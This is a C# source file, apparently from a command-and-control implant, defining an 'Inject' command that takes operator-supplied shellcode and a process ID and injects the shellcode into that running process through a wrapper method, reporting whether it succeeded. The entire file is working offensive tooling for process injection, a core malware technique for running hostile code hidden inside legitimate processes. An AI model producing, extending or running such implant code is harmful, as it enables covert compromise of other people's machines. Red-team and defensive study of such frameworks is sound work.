using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class InjectCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Inject;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.File, $"ShellCode is mandatory!");
            task.ThrowIfParameterMissing(ParameterId.Id, $"ProcessId is mandatory!");

            var shellcode = task.GetParameter(ParameterId.File);

            int processId = task.GetParameter<int>(ParameterId.Id);

            var process = Process.GetProcessById(processId);
            if (process == null)
            {
                context.AppendResult($"Unable to find process with Id {processId}");
                return;
            }

            try
            {
                APIWrapper.Inject(process.Handle, IntPtr.Zero, shellcode, context.ConfigService.APIInjectionMethod);

                context.AppendResult($"Injection succeed.");
            }
            catch (Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }
        }
     
    }
}
